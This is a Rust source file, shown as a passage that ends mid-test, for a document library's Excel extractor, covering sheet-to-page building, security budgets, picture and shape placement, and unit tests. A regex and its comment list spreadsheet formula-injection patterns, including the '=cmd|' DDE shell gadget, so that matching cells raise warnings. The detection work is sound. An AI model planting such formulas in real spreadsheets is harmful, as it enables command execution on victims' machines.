//! Excel spreadsheet extractor.

use crate::Result;
use crate::core::config::ExtractionConfig;
use crate::extraction::excel::images::{XlsxPicture, XlsxShapeText};
use crate::extractors::security::SecurityBudget;
use crate::plugins::{InternalDocumentExtractor, Plugin};
use crate::types::internal::InternalDocument;
use crate::types::internal_builder::InternalDocumentBuilder;
use crate::types::page::PageContent;
use crate::types::tables::Table;
use crate::types::{ExcelMetadata, ExtractedImage, Metadata, ProcessingWarning};
use ahash::AHashMap;
use async_trait::async_trait;
use bytes::Bytes;
use std::borrow::Cow;
use std::path::Path;
use std::sync::Arc;

/// DDE and external-call formula patterns that should surface as warnings.
///
/// Calamine resolves most formulas to their cached result value, so the raw
/// `=DDE(...)` string rarely appears in `Data::String` cells. However, some
/// tools store the formula string directly (e.g. when no cached value
/// exists), and calamine emits it verbatim. The patterns below catch the
/// known injection-vector forms. Matching is case-insensitive and anchored
/// to the start of the cell value to avoid false positives on plain text.
///
/// Patterns:
/// - `=DDE(` — Dynamic Data Exchange
/// - `=WEBSERVICE(` — HTTP fetch from external URL
/// - `=HYPERLINK(` — clickable URL (not execution, but disclosure risk)
/// - `=cmd|` — classic CSV/OOXML RCE gadget via DDE with cmd shell
static DDE_PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();

fn dde_pattern() -> &'static regex::Regex {
    DDE_PATTERN.get_or_init(|| regex::Regex::new(r"(?i)^=(DDE\(|WEBSERVICE\(|HYPERLINK\(|cmd\|)").unwrap())
}

/// Classify the formula kind from a matching cell value for the warning message.
fn classify_formula(cell: &str) -> &'static str {
    let upper = cell.to_ascii_uppercase();
    if upper.starts_with("=DDE(") {
        "DDE"
    } else if upper.starts_with("=WEBSERVICE(") {
        "WEBSERVICE"
    } else if upper.starts_with("=HYPERLINK(") {
        "HYPERLINK"
    } else {
        "ExternalCall"
    }
}

/// Scan all cells in a workbook for DDE / external-call formula strings.
///
/// Returns one `ProcessingWarning` per matching cell (capped at 100 to avoid
/// flooding the warnings list on adversarial documents). The warning carries
/// the sheet name, zero-based row/col coordinates, and the classified formula
/// kind so downstream consumers can triage.
fn scan_for_dde_warnings(workbook: &crate::types::ExcelWorkbook) -> Vec<ProcessingWarning> {
    const MAX_DDE_WARNINGS: usize = 100;
    let pattern = dde_pattern();
    let mut warnings = Vec::new();

    'outer: for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            for (row_idx, row) in cells.iter().enumerate() {
                for (col_idx, cell) in row.iter().enumerate() {
                    if !cell.is_empty() && pattern.is_match(cell) {
                        let kind = classify_formula(cell);
                        warnings.push(ProcessingWarning {
                            source: Cow::Borrowed("excel_dde_scan"),
                            message: Cow::Owned(format!(
                                "Cell [{sheet}!R{row}C{col}] contains \
                                 a {kind} formula that may reference external resources",
                                sheet = sheet.name,
                                row = row_idx + 1,
                                col = col_idx + 1,
                            )),
                        });
                        if warnings.len() >= MAX_DDE_WARNINGS {
                            break 'outer;
                        }
                    }
                }
            }
        }
    }

    warnings
}

/// Validate an Excel workbook against security limits.
///
/// Iterates sheets and their cells, enforcing `max_table_cells` and
/// `max_content_size` via the provided [`SecurityBudget`].
fn validate_workbook_budget(workbook: &crate::types::ExcelWorkbook, budget: &mut SecurityBudget) -> crate::Result<()> {
    for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            let row_count = cells.len();
            let col_count = cells.iter().map(|r| r.len()).max().unwrap_or(0);
            budget.add_cells(row_count.saturating_mul(col_count))?;
            for row in cells {
                for cell in row {
                    budget.account_text(cell.len())?;
                }
            }
        }
    }
    Ok(())
}

/// Charge a workbook's cells and floating shape text against one budget.
///
/// Shared by both entry points (`extract_content` for in-memory bytes,
/// `extract_path` for files) so the CLI and the HTTP/FFI callers enforce the
/// same `SecurityLimits`: a budget only one of them applies is no budget at all.
/// Floating shape text is body content the drawing walk surfaced, so it answers
/// to the same `max_content_size` the cell text does — without this, a workbook
/// whose content lives in shapes carries an unbounded amount of text past the
/// limits every other path enforces.
fn charge_workbook_budget(
    workbook: &crate::types::ExcelWorkbook,
    shapes: &[XlsxShapeText],
    budget: &mut SecurityBudget,
) -> crate::Result<()> {
    validate_workbook_budget(workbook, budget)?;
    for shape in shapes {
        budget.account_text(shape.text.len())?;
    }
    Ok(())
}

/// MIME types backed by an OOXML (or OOXML-derived binary) ZIP package, i.e.
/// formats whose package may carry embedded objects under `xl/embeddings/`
/// (xberg-io/xberg#78) and embedded pictures under `xl/media/`.
/// `.xls`/`.xla` (legacy binary, not a ZIP) and `.ods` (OpenDocument, different
/// embedding convention) are excluded.
fn is_ooxml_zip_mime(mime_type: &str) -> bool {
    matches!(
        mime_type,
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
            | "application/vnd.ms-excel.sheet.macroEnabled.12"
            | "application/vnd.ms-excel.addin.macroEnabled.12"
            | "application/vnd.ms-excel.template.macroEnabled.12"
            | "application/vnd.ms-excel.sheet.binary.macroEnabled.12"
            | "application/vnd.openxmlformats-officedocument.spreadsheetml.template"
    )
}

/// Excel spreadsheet extractor using calamine.
///
/// Supports: .xlsx, .xlsm, .xlam, .xltm, .xls, .xla, .xlsb, .ods
#[cfg_attr(alef, alef(skip))]
pub struct ExcelExtractor;

impl Default for ExcelExtractor {
    fn default() -> Self {
        Self::new()
    }
}

impl ExcelExtractor {
    pub(crate) fn new() -> Self {
        Self
    }

    /// Escape markdown-significant characters in a sheet name for use in a heading.
    ///
    /// Prevents adversarial or unusual sheet names from producing double headings (e.g.
    /// `## ## Profit`) or broken inline elements (e.g. `[Sales](evil)` rendered as a
    /// link). Escapes: `#`, `>`, `-`, `*`, `+`, `\`, `` ` ``, `_`, `[`, `]`, `<`, `>`.
    /// Leading whitespace is stripped because it is invisible and can confuse renderers.
    ///
    /// Scope: used only for the per-page heading in XLSX/ODS output; does not affect the
    /// stored `sheet_name` field, which always carries the raw name.
    fn escape_sheet_name_for_heading(name: &str) -> String {
        const INLINE_METACHARS: &[char] = &['\\', '`', '*', '_', '[', ']', '<', '>', '!'];

        let name = name.trim_start();
        let mut out = String::with_capacity(name.len() + 8);

        for (i, ch) in name.char_indices() {
            let needs_escape =
                (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~')) || INLINE_METACHARS.contains(&ch);
            if needs_escape {
                out.push('\\');
            }
            out.push(ch);
        }

        out
    }

    /// Parse the `hidden_sheets` workbook-metadata entry (a comma-separated list of
    /// sheet names populated by `extraction::excel::extract_metadata` from calamine's
    /// `sheets_metadata()`) into the set of sheet names that are hidden or very-hidden
    /// (xberg-io/xberg#119). A sheet's own content carries no visibility flag, so this
    /// is the only way `build_internal_document` can tell a hidden sheet from a visible
    /// one.
    fn hidden_sheet_names(workbook: &crate::types::ExcelWorkbook) -> std::collections::HashSet<&str> {
        workbook
            .metadata
            .get("hidden_sheets")
            .map(|names| names.split(", ").collect())
            .unwrap_or_default()
    }

    /// Build an `InternalDocument` from the workbook.
    ///
    /// Each sheet becomes a table preceded by an H2 heading with the sheet name (when
    /// non-empty). A sheet hidden in the workbook (`hidden_sheets` metadata) has
    /// `" (hidden)"` appended to its heading so hidden content is distinguishable from
    /// visible content (xberg-io/xberg#119). Additionally, `prebuilt_pages` is set to
    /// `Some(Vec<PageContent>)` with one entry per sheet so that `ExtractedDocument.pages`
    /// is always `Some` for Excel.
    ///
    /// Empty sheets still produce a `PageContent` entry so the page index aligns with the
    /// sheet index. The top-level `content` remains the concatenation of all per-sheet
    /// content, preserving backward compat for callers that do not read `pages`.
    ///
    /// `pictures` are the workbook's `xl/media/*` parts. Each is emitted as exactly one
    /// `ElementKind::Image` element, in the element stream of the sheet its drawing part
    /// anchors it to (or at the end of the document when no drawing names a sheet), so
    /// the OCR pass and the markdown renderer both see every picture.
    fn build_internal_document(
        workbook: &crate::types::ExcelWorkbook,
        mut pictures: Vec<XlsxPicture>,
        mut shapes: Vec<XlsxShapeText>,
    ) -> InternalDocument {
        let mut builder = InternalDocumentBuilder::new("excel");
        let mut pages: Vec<PageContent> = Vec::with_capacity(workbook.sheets.len());
        let hidden_sheets = Self::hidden_sheet_names(workbook);

        // Resolve each picture's sheet by name. The drawing parts name the sheet that holds
        // them, while this loop only sees the sheets that actually loaded, so a positional
        // match would move every picture of a skipped sheet (a chartsheet part, an unreadable
        // worksheet) onto the next one.
        let page_by_sheet_name: AHashMap<&str, u32> = workbook
            .sheets
            .iter()
            .enumerate()
            .map(|(index, sheet)| (sheet.name.as_str(), (index + 1) as u32))
            .collect();
        for picture in pictures.iter_mut() {
            if picture.sheet_index.is_none() {
                picture.sheet_index =
                    picture.sheet_name.as_deref().and_then(|name| page_by_sheet_name.get(name).copied());
            }
        }

        // Placed pictures are consumed sheet by sheet from the back of this
        // vector, so sorting ascending and popping yields sheet order and, within
        // a sheet, row-major reading order. A picture with no known sheet sorts
        // last and is emitted after every sheet.
        pictures.sort_by_key(|picture| (picture.sheet_index.unwrap_or(u32::MAX), picture.anchor));
        pictures.reverse();

        // Placed shapes are consumed exactly like the pictures above: sorted
        // ascending, then popped from the back, so each sheet gets its own shapes
        // in row-major reading order and an unplaced shape sorts last.
        shapes.sort_by_key(|shape| {
            let page = page_by_sheet_name
                .get(shape.sheet_name.as_str())
                .copied()
                .unwrap_or(u32::MAX);
            (page, shape.anchor)
        });
        shapes.reverse();

        // `doc.images` is only ever filled by `push_image`, so this counter is the
        // position of the next image *and* the index its element must carry — the
        // two can never disagree, unlike indexing from a drawing's own id.
        let mut next_image_index: u32 = 0;

        for (sheet_index, sheet) in workbook.sheets.iter().enumerate() {
            let page_number = (sheet_index + 1) as u32;
            let name_opt: Option<String> = if sheet.name.is_empty() {
                None
            } else {
                Some(sheet.name.clone())
            };
            let is_hidden = hidden_sheets.contains(sheet.name.as_str());
            let hidden_suffix = if is_hidden { " (hidden)" } else { "" };
            let page_index = pages.len();

            if let Some(cells) = &sheet.table_cells
                && !cells.is_empty()
            {
                if !sheet.name.is_empty() {
                    builder.push_heading(2, &format!("{}{hidden_suffix}", sheet.name), None, None);
                }
                builder.push_table_from_cells(cells, Some(page_number), None);

                let page_content = if sheet.name.is_empty() {
                    sheet.markdown.clone()
                } else {
                    format!(
                        "## {}{hidden_suffix}\n\n{}",
                        Self::escape_sheet_name_for_heading(&sheet.name),
                        sheet.markdown
                    )
                };

                let arc_table = Arc::new(Table {
                    cells: cells.clone(),
                    markdown: sheet.markdown.clone(),
                    page_number,
                    bounding_box: None,
                    ..Default::default()
                });

                pages.push(PageContent {
                    page_number,
                    content: page_content,
                    tables: vec![arc_table],
                    image_indices: Vec::new(),
                    image_preprocessing: None,
                    hierarchy: None,
                    is_blank: Some(false),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                    ocr_confidence: None,
                });
            } else {
                let content = match name_opt.as_deref() {
                    Some(n) => format!("## {}{hidden_suffix}\n\n", Self::escape_sheet_name_for_heading(n)),
                    None => String::new(),
                };

                pages.push(PageContent {
                    page_number,
                    content,
                    tables: Vec::new(),
                    image_indices: Vec::new(),
                    image_preprocessing: None,
                    hierarchy: None,
                    is_blank: Some(true),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                    ocr_confidence: None,
                });
            }

            // The sheet is one table element, so a picture has no cell-level
            // element to sit inside: it follows the sheet it is anchored to,
            // ordered by its anchor cell, which is as close as a sheet-granular
            // element stream can place it.
            let mut sheet_image_indices = Vec::new();
            while pictures.last().and_then(|picture| picture.sheet_index) == Some(page_number) {
                let picture = pictures.pop().expect("the last picture was just inspected");
                sheet_image_indices.push(Self::push_picture(
                    &mut builder,
                    picture,
                    Some(page_number),
                    &mut next_image_index,
                ));
            }
            pages[page_index].image_indices = sheet_image_indices;
            // A sheet's floating shapes are content too — a workflow diagram drawn in
            // Excel lives entirely in them. The sheet is one table element, so a shape
            // has no cell-level element to sit inside and follows the sheet it is
            // anchored to, in reading order.
            let sheet_shape_count = Self::push_sheet_shapes(
                &mut builder,
                &mut shapes,
                &page_by_sheet_name,
                page_number,
            );
            // A sheet with no cells is blank only while nothing is anchored to it: a picture
            // or a diagram the page carries is content, and every other extractor clears
            // `is_blank` when it attaches one. Leaving `Some(true)` here made consumers that
            // test the flag drop a page whose only content is a screenshot.
            if (!pages[page_index].image_indices.is_empty() || sheet_shape_count > 0)
                && pages[page_index].is_blank == Some(true)
            {
                pages[page_index].is_blank = Some(false);
            }
        }

        // Whatever the pops did not consume (pictures no loaded sheet claimed)
        // is left in the reversed vector in descending order; walking it back
        // with `rev()` emits it in the same ascending order the placed
        // pictures used, instead of backwards through the media files.
        for picture in pictures.into_iter().rev() {
            Self::push_picture(&mut builder, picture, None, &mut next_image_index);
        }
        Self::push_sheet_shapes(&mut builder, &mut shapes, &page_by_sheet_name, 0);

        let mut doc = builder.build();
        doc.prebuilt_pages = Some(pages);
        doc
    }

    /// Push the shapes anchored to `page_number` as paragraph elements, and
    /// return how many were pushed.
    ///
    /// `shapes` is sorted ascending and consumed from the back (see the call
    /// site). Doing the same for `page_number` zero pushes every shape whose
    /// drawing part never named a sheet, at the end of the document.
    ///
    /// The two sentinels only cooperate because page numbers are one-based
    /// (`sheet_index + 1` at the call site): the sort keys an unknown sheet as
    /// `u32::MAX` so the per-page walk never touches it, while the match treats
    /// an unknown sheet as `0` so the final `page_number == 0` drain collects
    /// exactly those. A zero-based page numbering would make both paths fight
    /// over the first sheet's shapes — keep the pages one-based.
    fn push_sheet_shapes(
        builder: &mut InternalDocumentBuilder,
        shapes: &mut Vec<XlsxShapeText>,
        page_by_sheet_name: &AHashMap<&str, u32>,
        page_number: u32,
    ) -> usize {
        let mut pushed = 0;
        while shapes.last().is_some_and(|shape| {
            page_by_sheet_name
                .get(shape.sheet_name.as_str())
                .copied()
                .unwrap_or(0)
                == page_number
        }) {
            let shape = shapes.pop().expect("the last shape was just inspected");
            let page = (page_number > 0).then_some(page_number);
            builder.push_paragraph(&shape.text, Vec::new(), page, None);
            pushed += 1;
        }
        pushed
    }

    /// Push one picture as an `ElementKind::Image` element and return its index
    /// in `doc.images`, which `next_image_index` has to match so the element and
    /// the stored image always agree.
    ///
    /// The returned index is the *image* index, not the element index
    /// `push_image` returns: `PageContent::image_indices` holds positions in
    /// `doc.images` (see `build_pages`), and conflating the two would point
    /// page-level consumers at the wrong image.
    fn push_picture(
        builder: &mut InternalDocumentBuilder,
        picture: XlsxPicture,
        page: Option<u32>,
        next_image_index: &mut u32,
    ) -> u32 {
        let image_index = *next_image_index;
        *next_image_index += 1;
        let description = picture.description.clone();
        builder.push_image(
            description.as_deref(),
            ExtractedImage {
                data: Bytes::from(picture.data),
                format: picture.format,
                image_index,
                page_number: page,
                description: picture.description,
                source_path: Some(picture.source_path),
                ..Default::default()
            },
            page,
            None,
        );
        image_index
    }
}

impl Plugin for ExcelExtractor {
    fn name(&self) -> &str {
        "excel-extractor"
    }

    fn version(&self) -> String {
        env!("CARGO_PKG_VERSION").to_string()
    }

    fn initialize(&self) -> Result<()> {
        Ok(())
    }

    fn shutdown(&self) -> Result<()> {
        Ok(())
    }
}

impl ExcelExtractor {
    /// Build an InternalDocument from a workbook with metadata.
    fn workbook_to_internal_document(
        workbook: &crate::types::ExcelWorkbook,
        pictures: Vec<XlsxPicture>,
        shapes: Vec<XlsxShapeText>,
    ) -> InternalDocument {
        let mut doc = Self::build_internal_document(workbook, pictures, shapes);

        let sheet_names: Vec<String> = workbook.sheets.iter().map(|s| s.name.clone()).collect();
        let sheet_count = workbook.sheets.len() as u32;
        let excel_metadata = ExcelMetadata {
            sheet_count: Some(sheet_count),
            sheet_names: Some(sheet_names),
        };

        let mut additional = AHashMap::new();
        let wb_meta = &workbook.metadata;

        let title = wb_meta.get("title").cloned();
        let subject = wb_meta.get("subject").cloned();
        let created_by = wb_meta.get("created_by").or_else(|| wb_meta.get("creator")).cloned();
        let modified_by = wb_meta.get("modified_by").cloned();
        let created_at = wb_meta.get("created_at").cloned();
        let modified_at = wb_meta.get("modified_at").cloned();
        let authors = created_by.as_ref().map(|a| vec![a.clone()]);
        let keywords = wb_meta.get("keywords").map(|k| {
            k.split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        });
        let language = wb_meta.get("language").cloned();

        for (key, value) in &workbook.metadata {
            match key.as_str() {
                "title" | "subject" | "created_by" | "creator" | "modified_by" | "created_at" | "modified_at"
                | "keywords" | "language" => {}
                _ => {
                    additional.insert(Cow::Owned(key.clone()), serde_json::json!(value));
                }
            }
        }

        doc.metadata = Metadata {
            title,
            subject,
            authors,
            keywords,
            language,
            created_at,
            modified_at,
            created_by,
            modified_by,
            format: Some(crate::types::FormatMetadata::Excel(excel_metadata)),
            additional,
            ..Default::default()
        };

        doc.revisions = workbook.revisions.clone();

        for warning in scan_for_dde_warnings(workbook) {
            doc.processing_warnings.push(warning);
        }

        doc
    }
}

#[cfg_attr(not(target_arch = "wasm32"), async_trait)]
#[cfg_attr(target_arch = "wasm32", async_trait(?Send))]
impl InternalDocumentExtractor for ExcelExtractor {
    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, content, config),
        fields(
            extractor.name = self.name(),
            content.size_bytes = content.len(),
        )
    ))]
    async fn extract_content(
        &self,
        content: &[u8],
        mime_type: &str,
        config: &ExtractionConfig,
    ) -> Result<InternalDocument> {
        let extension = match mime_type {
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" => ".xlsx",
            "application/vnd.ms-excel.sheet.macroEnabled.12" => ".xlsm",
            "application/vnd.ms-excel.addin.macroEnabled.12" => ".xlam",
            "application/vnd.ms-excel.template.macroEnabled.12" => ".xltm",
            "application/vnd.ms-excel" => ".xls",
            "application/vnd.ms-excel.addin.macroEnabled" => ".xla",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12" => ".xlsb",
            "application/vnd.oasis.opendocument.spreadsheet" => ".ods",
            _ => ".xlsx",
        };

        let security_limits = config.security_limits.clone().unwrap_or_default();
        let want_pictures = config.needs_image_data() && is_ooxml_zip_mime(mime_type);
        // Shape text is body content, not image data, so the drawing walk runs for every
        // ZIP-backed workbook; `want_pictures` only decides whether the media bytes are
        // loaded along with it.
        let want_drawings = is_ooxml_zip_mime(mime_type);

        let (read_result, pictures, shapes) = {
            #[cfg(feature = "tokio-runtime")]
            {
                if crate::core::batch_mode::is_batch_mode() {
                    if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                        return Err(crate::error::XbergError::Cancelled);
                    }
                    let content_owned = content.to_vec();
                    let extension_owned = extension.to_string();
                    let limits_owned = security_limits.clone();
                    let span = tracing::Span::current();
                    let read = tokio::task::spawn_blocking(move || {
                        let _guard = span.entered();
                        let result = crate::extraction::excel::read_excel_bytes(
                            &content_owned,
                            &extension_owned,
                            &limits_owned,
                        )?;
                        // The drawings live in the same ZIP the workbook was read from, and
                        // parsing them is the same blocking IO + XML work, so they are read
                        // inside this task rather than on the async runtime.
                        let (pictures, shapes) = if want_drawings {
                            crate::extraction::excel::images::read_xlsx_drawings_from_bytes(
                                &content_owned,
                                &limits_owned,
                                want_pictures,
                            )
                        } else {
                            (Vec::new(), Vec::new())
                        };
                        Ok::<_, crate::error::XbergError>((result, pictures, shapes))
                    })
                    .await
                    .map_err(|e| crate::error::XbergError::parsing(format!("Excel extraction task failed: {}", e)))??;
                    (read.0, read.1, read.2)
                } else {
                    let read = crate::extraction::excel::read_excel_bytes(content, extension, &security_limits)?;
                    let (pictures, shapes) = if want_drawings {
                        crate::extraction::excel::images::read_xlsx_drawings_from_bytes(
                            content,
                            &security_limits,
                            want_pictures,
                        )
                    } else {
                        (Vec::new(), Vec::new())
                    };
                    (read, pictures, shapes)
                }
            }
            #[cfg(not(feature = "tokio-runtime"))]
            {
                if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                    return Err(crate::error::XbergError::Cancelled);
                }
                let read = crate::extraction::excel::read_excel_bytes(content, extension, &security_limits)?;
                let (pictures, shapes) = if want_drawings {
                    crate::extraction::excel::images::read_xlsx_drawings_from_bytes(
                        content,
                        &security_limits,
                        want_pictures,
                    )
                } else {
                    (Vec::new(), Vec::new())
                };
                (read, pictures, shapes)
            }
        };
        let (workbook, read_warnings) = read_result;

        let mut budget = SecurityBudget::from_config(config);
        charge_workbook_budget(&workbook, &shapes, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook, pictures, shapes);
        doc.processing_warnings.extend(read_warnings);
        doc.mime_type = mime_type.to_string();

        #[cfg(feature = "office")]
        if config.max_archive_depth > 0 && is_ooxml_zip_mime(mime_type) {
            let (children, embed_warnings) = crate::extraction::ooxml_embedded::extract_ooxml_embedded_objects(
                content,
                "xl/embeddings/",
                "excel",
                config,
            )
            .await;
            if !children.is_empty() {
                doc.children = Some(children);
                // The path entry point merges embedded-object text into the body; the bytes
                // entry point must produce the same document, or the same workbook renders
                // with the embedded text (path/CLI) or without it (bytes/HTTP/FFI).
                crate::extraction::ooxml_embedded::append_embedded_object_text(&mut doc);
            }
            doc.processing_warnings.extend(embed_warnings);
        }

        Ok(doc)
    }

    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, path, config),
        fields(
            extractor.name = self.name(),
        )
    ))]
    async fn extract_path(&self, path: &Path, mime_type: &str, config: &ExtractionConfig) -> Result<InternalDocument> {
        let path_str = path
            .to_str()
            .ok_or_else(|| crate::XbergError::validation("Invalid file path".to_string()))?;

        let security_limits = config.security_limits.clone().unwrap_or_default();
        let (workbook, read_warnings) = crate::extraction::excel::read_excel_file(path_str, &security_limits)?;
        let (pictures, shapes) = if is_ooxml_zip_mime(mime_type) {
            crate::extraction::excel::images::read_xlsx_drawings_from_file(
                path,
                &security_limits,
                config.needs_image_data(),
            )
        } else {
            (Vec::new(), Vec::new())
        };
        // Same budget the bytes entry point enforces: the file entry point (the CLI's
        // path for on-disk workbooks) must not accept a workbook the bytes entry
        // point rejects.
        let mut budget = SecurityBudget::from_config(config);
        charge_workbook_budget(&workbook, &shapes, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook, pictures, shapes);
        doc.processing_warnings.extend(read_warnings);
        doc.mime_type = mime_type.to_string();

        #[cfg(feature = "office")]
        if config.max_archive_depth > 0 && is_ooxml_zip_mime(mime_type) {
            let file_bytes = crate::core::io::open_file_bytes(path)?;
            let (children, embed_warnings) = crate::extraction::ooxml_embedded::extract_ooxml_embedded_objects(
                &file_bytes,
                "xl/embeddings/",
                "excel",
                config,
            )
            .await;
            if !children.is_empty() {
                doc.children = Some(children);
                crate::extraction::ooxml_embedded::append_embedded_object_text(&mut doc);
            }
            doc.processing_warnings.extend(embed_warnings);
        }

        Ok(doc)
    }

    fn supported_mime_types(&self) -> &[&str] {
        &[
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-excel.sheet.macroEnabled.12",
            "application/vnd.ms-excel.addin.macroEnabled.12",
            "application/vnd.ms-excel.template.macroEnabled.12",
            "application/vnd.ms-excel",
            "application/vnd.ms-excel.addin.macroEnabled",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template",
        ]
    }

    fn priority(&self) -> i32 {
        50
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{ExcelSheet, ExcelWorkbook};
    use std::collections::HashMap;

    fn make_sheet(name: &str, cells: Option<Vec<Vec<String>>>) -> ExcelSheet {
        let (markdown, row_count, col_count, cell_count) = match cells.as_ref() {
            Some(c) if !c.is_empty() => {
                let rows = c.len();
                let cols = c.iter().map(|r| r.len()).max().unwrap_or(0);
                let count = c.iter().flat_map(|r| r.iter()).filter(|s| !s.is_empty()).count();
                let mut md = String::new();
                for (i, row) in c.iter().enumerate() {
                    md.push('|');
                    for cell in row {
                        md.push(' ');
                        md.push_str(cell);
                        md.push_str(" |");
                    }
                    md.push('\n');
                    if i == 0 && c.len() > 1 {
                        md.push('|');
                        for _ in row {
                            md.push_str(" --- |");
                        }
                        md.push('\n');
                    }
                }
                (md, rows, cols, count)
            }
            _ => (String::new(), 0, 0, 0),
        };
        ExcelSheet {
            name: name.to_string(),
            markdown,
            row_count,
            col_count,
            cell_count,
            table_cells: cells,
        }
    }

    fn make_workbook(sheets: Vec<ExcelSheet>) -> ExcelWorkbook {
        ExcelWorkbook {
            sheets,
            metadata: HashMap::new(),
            revisions: None,
        }
    }

    #[test]
    fn test_excel_extractor_plugin_interface() {
        let extractor = ExcelExtractor::new();
        assert_eq!(extractor.name(), "excel-extractor");
        assert!(extractor.initialize().is_ok());
        assert!(extractor.shutdown().is_ok());
    }

    #[test]
    fn test_excel_extractor_supported_mime_types() {
        let extractor = ExcelExtractor::new();
        let mime_types = extractor.supported_mime_types();
        assert_eq!(mime_types.len(), 9);
        assert!(mime_types.contains(&"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"));
        assert!(mime_types.contains(&"application/vnd.ms-excel"));
    }

    #[test]
    fn test_prebuilt_pages_always_some() {
        let workbook = make_workbook(vec![]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());
        assert!(doc.prebuilt_pages.is_some());
        assert_eq!(doc.prebuilt_pages.unwrap().len(), 0);
    }

    #[test]
    fn test_single_sheet_produces_one_page() {
        let cells = vec![
            vec!["Name".to_string(), "Value".to_string()],
            vec!["A".to_string(), "1".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Sheet1", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Sheet1"));
        assert_eq!(pages[0].section_name, None);
        assert!(pages[0].content.contains("Sheet1"));
        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[0].is_blank, Some(false));
    }

    #[test]
    fn test_single_sheet_content_matches_flat_content() {
        let cells = vec![
            vec!["Col1".to_string(), "Col2".to_string()],
            vec!["r1".to_string(), "r2".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Data", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        assert!(pages[0].content.starts_with("## Data"));
        assert!(pages[0].content.contains("Col1"));
        assert!(pages[0].content.contains("r1"));
    }

    #[test]
    fn test_multi_sheet_workbook_produces_one_page_per_sheet() {
        let sheet1_cells = vec![
            vec!["A".to_string(), "B".to_string()],
            vec!["1".to_string(), "2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string(), "Q".to_string(), "R".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Second", Some(sheet2_cells)),
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 3);

        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        assert_eq!(pages[0].sheet_name.as_deref(), Some("First"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Second"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("Third"));
        assert_eq!(pages[0].section_name, None);
        assert_eq!(pages[1].section_name, None);
        assert_eq!(pages[2].section_name, None);

        assert!(pages[0].content.contains("First"));
        assert!(!pages[0].content.contains("Second"));
        assert!(pages[1].content.contains("Second"));
        assert!(!pages[1].content.contains("First"));
        assert!(pages[2].content.contains("Third"));

        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[1].tables.len(), 1);
        assert_eq!(pages[2].tables.len(), 1);

        assert_eq!(pages[0].tables[0].cells[0][0], "A");
        assert_eq!(pages[1].tables[0].cells[0][0], "X");
        assert_eq!(pages[2].tables[0].cells[0][0], "P");
    }

    #[test]
    fn test_top_level_tables_populated_for_multi_sheet_workbook() {
        let sheet1_cells = vec![
            vec!["H1".to_string(), "H2".to_string()],
            vec!["r1c1".to_string(), "r1c2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("Alpha", Some(sheet1_cells)),
            make_sheet("Beta", Some(sheet2_cells)),
            make_sheet("Gamma", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        assert_eq!(
            doc.tables.len(),
            3,
            "top-level tables count must equal number of sheets with data"
        );

        assert_eq!(doc.tables[0].page_number, 1);
        assert_eq!(doc.tables[1].page_number, 2);
        assert_eq!(doc.tables[2].page_number, 3);

        assert_eq!(doc.tables[0].cells[0][0], "H1");
        assert_eq!(doc.tables[1].cells[0][0], "X");
        assert_eq!(doc.tables[2].cells[0][0], "P");
    }

    #[test]
    fn test_empty_sheet_in_middle_produces_page_at_correct_index() {
        let sheet1_cells = vec![vec!["A".to_string()]];
        let sheet3_cells = vec![vec!["C".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Empty", None),
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
